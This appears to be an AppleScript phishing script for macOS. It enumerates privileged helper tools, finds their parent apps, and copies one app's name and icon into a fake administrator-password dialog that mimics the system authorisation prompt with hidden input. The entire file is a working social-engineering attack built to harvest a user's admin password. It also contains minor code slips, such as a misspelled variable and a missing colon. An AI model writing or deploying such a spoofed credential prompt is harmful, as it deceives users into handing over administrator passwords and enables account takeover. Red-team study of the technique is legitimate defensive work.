###########
-- imports
###########

use AppleScript version "2.4"
use framework "Foundation"
use scripting additions

# classes, constants, enums
property NSString : a reference to current application's NSString
property NSFileManager : a reference to current application's NSFileManager
property NSWorkspace : a reference to current application's NSWorkspace

set NSDirectoryEnumerationSkipsHiddenFiles to a reference to 4
set NSFileManager to a reference to current application's NSFileManager
set NSDirectoryEnumerationSkipsPackageDescendants to a reference to 2

set pht to "/Library/PrivilegedHelperTools"


-- variables
set defaultIconName to "AppIcon"
set defaultIconStr to "/System/Library/CoreServices/Software Update.app/Contents/Resources/SoftwareUpdate.icns"
set resourcesFldr to "/Contents/Resources/"
set pht to "/Library/PrivilegedHelperTools"
set iconExt to ".icns"
set makeChanges to " wants to make changes."
set privString to "Enter the Administrator password for "
set allowThis to " to allow this."
set software_update_icon to ""

on removeWhiteSpace:aString
	set theString to current application's NSString's stringWithString:aString
	set theWhiteSet to current application's NSCharacterSet's whitespaceAndNewlineCharacterSet()
	set theString to theString's stringByTrimmingCharactersInSet:theWhiteSet
	return theString
end removeWhiteSpace:

on removePunctuation:aString
	set theString to current application's NSString's stringWithString:aString
	set thePuncSet to current application's NSCharacterSet's punctuationCharacterSet()
	set theString to theString's stringByTrimmingCharactersInSet:thePuncSet
	return theString
end removePunctuation:

on getSubstringFromIndex:anIndex ofString:aString
	set s_String to NSString's stringWithString:aString
	return s_String's substringFromIndex:anIndex
end getSubstringFromIndex:ofString:

on getSubstringToIndex:anIndex ofString:aString
	set s_String to NSString's stringWithString:aString
	return s_String's substringToIndex:anIndex
end getSubstringToIndex:ofString:

on getSubstringFromCharacter:char inString:source_string
	set s_String to NSString's stringWithString:source_string
	set find_char to NSString's stringWithString:char
	set rangeOf to s_String's rangeOfString:char
	return s_String's substringFromIndex:(rangeOf's location)
end getSubstringFromCharacter:inString:

on getSubstringToCharacter:char inString:source_string
	set s_String to NSString's stringWithString:source_string
	set find_char to NSString's stringWithString:char
	set rangeOf to s_String's rangeOfString:char
	return s_String's substringToIndex(rangeOf's location)
end getSubstringToCharacter:inString:

on getOffsetOfLastOccurenceOf:target inString:source
	set astid to AppleScript's text item delimiters
	set AppleScript's text item delimiters to target
	try
		set ro to (count source) - (count text item -1 of source)
	end try
	set AppleScript's text item delimiters to astif
	return ro - (length of target) + 1
end getOffsetOfLastOccurenceOf:inString:


on getShortAppName:longAppName
	set longName to NSString's stringWithString:longAppName
	set lastIndex to my getOffsetOfLastOccurenceOf:"." inString:longName
	return its getSubstringToIndex:(lastIndex - 1) ofString:longName
end getShortAppName:

-- shamelessly stolen (adapted) from a script by Christopher Stone
on enumerateFolderContents:aFolderPath
	set folderItemList to "" as text
	set nsPath to current application's NSString's stringWithString:aFolderPath
	--- Expand Tilde & Symlinks (if any exist) ---
	set nsPath to nsPath's stringByResolvingSymlinksInPath()

	--- Get the NSURL ---
	set folderNSURL to current application's |NSURL|'s fileURLWithPath:nsPath

	set theURLs to (NSFileManager's defaultManager()'s enumeratorAtURL:folderNSURL includingPropertiesForKeys:{} options:((its NSDirectoryEnumerationSkipsPackageDescendants) + (get its NSDirectoryEnumerationSkipsHiddenFiles)) errorHandler:(missing value))'s allObjects()
	set AppleScript's text item delimiters to linefeed
	try
		set folderItemList to ((theURLs's valueForKey:"path") as list) as text
	end try
	return folderItemList
end enumerateFolderContents:

on getPrivilegedHelperTools()
	return its enumerateFolderContents:(my pht)
end getPrivilegedHelperTools

on getPrivilegedHelperApps()
	set helpers to paragraphs of its getPrivilegedHelperTools()
	set toolNames to {}
	repeat with n from 1 to count of helpers
		set this_helper to item n of helpers
		-- convert text to NSString
		set nsHelper to (NSString's stringWithString:this_helper)
		-- use NSString API to separate path
		set helperName to nsHelper's lastPathComponent()
		set end of toolNames to {name:helperName as text, path:this_helper}
	end repeat
	return toolNames
end getPrivilegedHelperApps

on getIconFor:thePath
	set aPath to NSString's stringWithString:thePath
	set bundlePath to current application's NSBundle's bundleWithPath:thePath
	set theDict to bundlePath's infoDictionary()
	set iconFile to theDict's valueForKeyPath:(NSString's stringWithString:"CFBundleIconFile")
	if (iconFile as text) contains ".icns" then
		set iconFile to iconFile's stringByDeletingPathExtension()
	end if
	return iconFile
end getIconFor:


set helpers to my getPrivilegedHelperApps()
set helpers_and_apps to {}

-- adapted from Erik Berglund
-- https://github.com/erikberglund/Scripts/blob/master/tools/privilegedHelperToolStatus/privilegedHelperToolStatus
repeat with hlpr in helpers
	set this_helper to hlpr's path
	try
		set idString to (do shell script "launchctl plist __TEXT,__info_plist " & this_helper & " | grep -A1 AuthorizedClients") as text
	on error
		try
			set idString to (do shell script "launchctl plist __TEXT,__info_plist " & this_helper & " | grep -A1 AllowedClients") as text
		end try
	end try
	set nsIDString to (NSString's stringWithString:idString)
	set sep to (NSString's stringWithString:"identifier")
	set components to (nsIDString's componentsSeparatedByString:sep)
	if (count of components) is 2 then
		set str to item 2 of components
		set str to (my removeWhiteSpace:str)
		set str to (my (its removePunctuation:str))
		set str to (str's stringByReplacingOccurrencesOfString:"\"" withString:"")
		set bundleID to (str's componentsSeparatedByString:" ")'s item 1
		set bundlePath to (NSWorkspace's sharedWorkspace's absolutePathForAppBundleWithIdentifier:bundleID)
		set end of helpers_and_apps to {parent:bundleID as text, path:bundlePath as text, helperName:hlpr's name as text, helperpath:hlpr's path}
	end if
end repeat

set helpersCount to count of helpers_and_apps
if helpersCount is greater than 0 then
	set n to (random number from 1 to helpersCount) as integer
	set chosenHelper to item n of helpers_and_apps
	set hlprName to chosenHelper's helperName
	set parentName to chosenHelper's path
	set shortName to my getShortAppName:(parentName as text)
	set my software_update_icon to POSIX file (my defaultIconStr as text)

	try
		set iconName to my getIconFor:parentName
		set my software_update_icon to POSIX file (parentName & my resourcesFldr & (iconName as text) & iconExt)
	end try

	set userName to current application's NSUserName()
	display dialog hlprName & my makeChanges & return & my privString & userName & my allowThis default answer "" with title parentName default button "OK" with icon my software_update_icon as «class furl» with hidden answer
end if
